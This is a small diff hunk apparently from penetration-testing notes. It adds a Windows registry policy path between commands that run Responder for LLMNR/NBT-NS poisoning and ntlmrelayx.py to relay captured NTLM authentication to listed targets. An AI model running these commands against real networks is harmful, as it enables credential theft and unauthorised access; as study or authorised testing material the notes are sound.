@@ -65,6 +65,8 @@ responder -I eth0 -rdwv
 
 gedit targets.txt (IPs Targets)
 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
 
 relay:
 root: ntlmrelayx.py -tf targets.txt -smb2support
